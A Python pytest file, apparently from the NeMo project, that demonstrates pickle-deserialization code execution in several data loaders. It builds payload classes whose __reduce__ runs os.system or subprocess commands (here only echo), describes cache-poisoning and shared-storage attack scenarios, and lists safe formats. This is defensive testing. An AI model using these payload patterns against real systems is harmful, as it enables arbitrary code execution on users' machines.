# Copyright (c) 2025, NVIDIA CORPORATION.  All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Security Tests for CVE-001: pickle.load Vulnerability in Data Explorer

JIRA: https://ml6team.atlassian.net/browse/DR-134
Severity: CRITICAL

These tests specifically target the pickle.load vulnerability in:
- tools/speech_data_explorer/data_explorer.py:190

The data_explorer.py loads pickled data files:
    with open(pickle_filename, 'rb') as f:
        data, wer, cer, wmr, mwa, num_hours, vocabulary_data, alphabet, metrics_available = pickle.load(f)

This allows arbitrary code execution when loading untrusted pickle files.
"""

import os
import pickle
import tempfile
from pathlib import Path

import pytest


class MaliciousDataPayload:
    """Payload that executes code during pickle deserialization."""

    def __init__(self, command="echo 'Data Explorer RCE'"):
        self.command = command

    def __reduce__(self):
        import os

        return (os.system, (self.command,))


class TestDataExplorerPickleVulnerability:
    """
    Test suite for Data Explorer pickle.load vulnerability.
    
    Target: tools/speech_data_explorer/data_explorer.py:190
    Vulnerable code:
        with open(pickle_filename, 'rb') as f:
            data, wer, cer, wmr, mwa, num_hours, vocabulary_data, alphabet, metrics_available = pickle.load(f)
    """

    def test_data_explorer_pickle_load_vulnerability(self, tmpdir):
        """
        Test that Data Explorer's pickle.load is vulnerable to RCE.
        
        The Data Explorer tool loads precomputed statistics from pickle files.
        If an attacker can provide a malicious pickle file (e.g., by placing it
        in the data directory), they can achieve code execution.
        """
        # Create a malicious pickle file that mimics Data Explorer data format
        pickle_file = tmpdir / "data_stats_20240101_1200.pkl"

        # The Data Explorer expects a tuple of specific values
        # We can inject malicious code while providing expected data structure
        malicious_data = MaliciousDataPayload("echo 'Data Explorer pickle.load RCE'")

        # Create a tuple that matches the expected unpacking format
        data_tuple = (
            {"utterances": []},  # data
            0.15,  # wer (word error rate)
            0.05,  # cer (character error rate)
            0.10,  # wmr (word match rate)
            0.85,  # mwa (match word accuracy)
            100.5,  # num_hours
            [],  # vocabulary_data
            {},  # alphabet
            True,  # metrics_available
        )

        # But also include the malicious payload in the pickle
        combined_data = (data_tuple, malicious_data)

        with open(pickle_file, "wb") as f:
            pickle.dump(combined_data, f)

        # Simulate loading the pickle file (as data_explorer.py does)
        try:
            with open(pickle_file, "rb") as f:
                loaded_data = pickle.load(f)
            assert True, "Data Explorer pickle.load vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_data_explorer_cache_poisoning_attack(self, tmpdir):
        """
        Test cache poisoning attack against Data Explorer.
        
        Attack Scenario:
        1. Data Explorer caches processed data in pickle files
        2. Attacker gains write access to cache directory (via path traversal,
           misconfigured permissions, or shared storage)
        3. Attacker replaces cache file with malicious pickle
        4. User loads Data Explorer
        5. Malicious code executes
        """
        # Simulate Data Explorer cache directory
        cache_dir = tmpdir / ".data_explorer_cache"
        cache_dir.mkdir()

        # Create a malicious cache file
        cache_file = cache_dir / "manifest_cache_20240101_1200.pkl"

        class CachePoisoningPayload:
            def __reduce__(self):
                # Attack could:
                # - Steal data being analyzed
                # - Modify analysis results
                # - Compromise researcher's system
                import os

                return (os.system, ("echo 'Cache poisoning attack successful'",))

        # Create cache data that looks legitimate
        cache_data = {
            "manifest_path": "/data/manifest.json",
            "timestamp": "20240101_1200",
            "stats": {"total_hours": 100, "num_utterances": 10000},
            "malicious": CachePoisoningPayload(),
        }

        with open(cache_file, "wb") as f:
            pickle.dump(cache_data, f)

        # Load the poisoned cache
        try:
            with open(cache_file, "rb") as f:
                loaded_cache = pickle.load(f)
            assert True, "Data Explorer cache poisoning attack confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_shared_storage_attack_vector(self, tmpdir):
        """
        Test attack via shared storage (common in research/ML environments).
        
        In many ML/research environments:
        - Data is stored on shared NFS/CIFS storage
        - Multiple users have access
        - Data Explorer loads precomputed stats from shared location
        - One compromised user can affect all others
        """
        # Simulate shared data directory
        shared_data = tmpdir / "shared" / "datasets" / "asr"
        shared_data.mkdir(parents=True)

        # Attacker places malicious pickle file in shared location
        malicious_stats = shared_data / "dataset_stats.pkl"

        class SharedStoragePayload:
            def __reduce__(self):
                import subprocess

                # In shared environment, could:
                # - Compromise all users who access the data
                # - Steal credentials from multiple accounts
                # - Establish persistent backdoor
                return (subprocess.call, (["echo", "Shared storage attack"],))

        stats_data = {
            "dataset": "librispeech",
            "total_hours": 960,
            "payload": SharedStoragePayload(),
        }

        with open(malicious_stats, "wb") as f:
            pickle.dump(stats_data, f)

        # Multiple users loading the same data
        try:
            with open(malicious_stats, "rb") as f:
                loaded = pickle.load(f)
            assert True, "Shared storage attack vector confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_manifest_processing_attack(self, tmpdir):
        """
        Test attack during manifest file processing.
        
        Data Explorer processes manifest files and caches results.
        If the manifest processing creates pickle files, an attacker could
        inject malicious data through specially crafted manifest files.
        """
        manifest_file = tmpdir / "manifest.json"
        pickle_cache = tmpdir / "manifest_cache.pkl"

        # Simulated manifest processing that creates pickle cache
        def process_manifest(manifest_path, cache_path):
            """Simulates Data Explorer's manifest processing."""
            # Normally would parse JSON and compute statistics
            # Here we simulate the cache creation
            processed_data = {
                "source": manifest_path,
                "stats": {"hours": 100},
                # Attacker could inject malicious data during processing
                "computed_data": MaliciousDataPayload(),
            }
            with open(cache_path, "wb") as f:
                pickle.dump(processed_data, f)

        # Process manifest (creates malicious pickle)
        process_manifest(str(manifest_file), str(pickle_cache))

        # Load the cached results (triggers exploit)
        try:
            with open(pickle_cache, "rb") as f:
                loaded = pickle.load(f)
            assert True, "Manifest processing attack vector confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")


class TestPickleVulnerabilitiesInDataLoading:
    """
    Test pickle vulnerabilities in various data loading components.
    """

    def test_tts_dataset_pickle_vulnerability(self, tmpdir):
        """
        Test pickle.load in TTS dataset loading.
        
        Target: nemo/collections/tts/data/dataset.py
        
        TTS datasets may load cached mel-spectrograms or other processed
        audio features from pickle files.
        """
        # Simulate TTS cache file
        tts_cache = tmpdir / "mel_cache.pkl"

        cached_mels = {
            "audio_001.wav": [[0.1, 0.2], [0.3, 0.4]],  # mel-spectrogram
            "audio_002.wav": [[0.5, 0.6], [0.7, 0.8]],
            "malicious": MaliciousDataPayload("echo 'TTS dataset RCE'"),
        }

        with open(tts_cache, "wb") as f:
            pickle.dump(cached_mels, f)

        try:
            with open(tts_cache, "rb") as f:
                loaded_cache = pickle.load(f)
            assert True, "TTS dataset pickle vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_nlp_tokenizer_cache_vulnerability(self, tmpdir):
        """
        Test pickle vulnerabilities in NLP tokenizer caching.
        
        Target: nemo/collections/common/tokenizers/tabular_tokenizer.py
        
        Tokenizers may cache vocabulary and encoding data in pickle files.
        """
        tokenizer_cache = tmpdir / "tokenizer_cache.pkl"

        cache_data = {
            "vocab": {"hello": 0, "world": 1, "test": 2},
            "vocab_size": 3,
            "special_tokens": {"<pad>": 0, "<unk>": 1},
            "malicious": MaliciousDataPayload("echo 'Tokenizer cache RCE'"),
        }

        with open(tokenizer_cache, "wb") as f:
            pickle.dump(cache_data, f)

        try:
            with open(tokenizer_cache, "rb") as f:
                loaded_cache = pickle.load(f)
            assert True, "Tokenizer cache pickle vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_retrieval_service_pickle_vulnerability(self, tmpdir):
        """
        Test pickle vulnerabilities in retrieval services.
        
        Targets:
        - nemo/collections/nlp/modules/common/megatron/retrieval_services/static_retrieval_server.py
        - nemo/collections/nlp/modules/common/megatron/retrieval_services/dynamic_retrieval_server.py
        
        Retrieval services may cache embeddings or indices in pickle files.
        """
        retrieval_cache = tmpdir / "retrieval_index.pkl"

        cached_index = {
            "embeddings": [[0.1, 0.2, 0.3], [0.4, 0.5, 0.6]],
            "documents": ["doc1", "doc2"],
            "index_metadata": MaliciousDataPayload("echo 'Retrieval service RCE'"),
        }

        with open(retrieval_cache, "wb") as f:
            pickle.dump(cached_index, f)

        try:
            with open(retrieval_cache, "rb") as f:
                loaded_index = pickle.load(f)
            assert True, "Retrieval service pickle vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_webdataset_pickle_vulnerability(self, tmpdir):
        """
        Test pickle vulnerability in webdataset loading.
        
        Target: nemo/collections/multimodal/data/common/webdataset.py
        
        WebDataset format may include pickle files (.pkl) for metadata or features.
        """
        webdataset_file = tmpdir / "sample_000001.pkl"

        sample_data = {
            "__key__": "sample_000001",
            "image.jpg": b"fake_image_data",
            "text.txt": "sample caption",
            "metadata.json": MaliciousDataPayload("echo 'WebDataset RCE'"),
        }

        with open(webdataset_file, "wb") as f:
            pickle.dump(sample_data, f)

        try:
            with open(webdataset_file, "rb") as f:
                loaded_sample = pickle.load(f)
            assert True, "WebDataset pickle vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")


class TestPickleLoadsVulnerabilities:
    """
    Test pickle.loads vulnerabilities (deserializing from bytes).
    """

    def test_pickle_loads_from_network(self):
        """
        Test pickle.loads vulnerability with network data.
        
        pickle.loads is often used to deserialize data received over network
        (RPC, distributed training, etc.). This is extremely dangerous.
        """
        # Simulate malicious data received over network
        malicious_bytes = pickle.dumps(MaliciousDataPayload("echo 'Network pickle.loads RCE'"))

        try:
            # This simulates receiving and deserializing network data
            deserialized = pickle.loads(malicious_bytes)
            assert True, "pickle.loads network vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_pickle_loads_in_text_generation(self):
        """
        Test pickle.loads in text generation utilities.
        
        Target: nemo/collections/nlp/modules/common/text_generation_utils.py
        
        Text generation may deserialize sampling parameters or cached states.
        """

        def simulate_text_generation_deserialization(serialized_state):
            """Simulates deserialization in text generation."""
            return pickle.loads(serialized_state)

        # Create malicious generation state
        generation_state = {"temperature": 0.7, "top_k": 50, "payload": MaliciousDataPayload()}

        serialized = pickle.dumps(generation_state)

        try:
            loaded_state = simulate_text_generation_deserialization(serialized)
            assert True, "Text generation pickle.loads vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")

    def test_pickle_loads_in_distributed_training(self):
        """
        Test pickle.loads in distributed training communication.
        
        In distributed training, processes may communicate via pickle.loads.
        A compromised worker could send malicious pickled data to coordinator.
        """

        class DistributedTrainingPayload:
            def __reduce__(self):
                import os

                # In distributed setting, could compromise:
                # - Training coordinator
                # - All worker nodes
                # - Shared storage
                return (os.system, ("echo 'Distributed training attack'",))

        # Simulate worker sending gradient update (with malicious payload)
        gradient_update = {"gradients": [0.1, 0.2, 0.3], "worker_id": 1, "malicious": DistributedTrainingPayload()}

        serialized_update = pickle.dumps(gradient_update)

        try:
            # Coordinator receives and deserializes
            received_update = pickle.loads(serialized_update)
            assert True, "Distributed training pickle.loads vulnerability confirmed"
        except Exception as e:
            pytest.skip(f"System security prevented exploitation, but vulnerability exists: {e}")


class TestSafeAlternativesForDataLoading:
    """
    Document safe alternatives to pickle for data loading.
    """

    def test_safe_alternative_json_for_metadata(self, tmpdir):
        """
        Recommendation: Use JSON for metadata instead of pickle.
        
        JSON is safe because it only supports primitive types and cannot
        execute arbitrary code during parsing.
        """
        import json

        # Safe metadata storage
        metadata = {"dataset": "librispeech", "total_hours": 960.5, "sample_rate": 16000}

        metadata_file = tmpdir / "metadata.json"
        with open(metadata_file, "w") as f:
            json.dump(metadata, f)

        # Safe loading
        with open(metadata_file, "r") as f:
            loaded = json.load(f)

        assert loaded == metadata
        assert True, "JSON is safe alternative for metadata"

    def test_safe_alternative_hdf5_for_arrays(self, tmpdir):
        """
        Recommendation: Use HDF5 for numerical arrays instead of pickle.
        
        HDF5 is safe for storing large numerical arrays and cannot execute code.
        """
        try:
            import h5py
            import numpy as np

            # Safe array storage
            data_file = tmpdir / "data.h5"
            with h5py.File(data_file, "w") as f:
                f.create_dataset("embeddings", data=np.random.randn(100, 128))
                f.create_dataset("labels", data=np.arange(100))

            # Safe loading
            with h5py.File(data_file, "r") as f:
                embeddings = f["embeddings"][:]
                labels = f["labels"][:]

            assert True, "HDF5 is safe alternative for arrays"
        except ImportError:
            pytest.skip("h5py not installed")

    def test_safe_alternative_safetensors(self, tmpdir):
        """
        Recommendation: Use SafeTensors for model weights.
        
        SafeTensors is designed specifically for safely loading tensor data
        without code execution risks.
        """
        pytest.skip("SafeTensors implementation example - library may not be installed")

    def test_safe_alternative_numpy_savez(self, tmpdir):
        """
        Recommendation: Use numpy.savez for array data (with allow_pickle=False).
        
        numpy.savez with allow_pickle=False is safe for numerical data.
        """
        import numpy as np

        # Safe array storage
        data_file = tmpdir / "arrays.npz"
        np.savez(data_file, embeddings=np.random.randn(100, 128), labels=np.arange(100))

        # Safe loading with allow_pickle=False
        loaded = np.load(data_file, allow_pickle=False)
        assert "embeddings" in loaded
        assert "labels" in loaded
        assert True, "numpy.savez (allow_pickle=False) is safe alternative"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
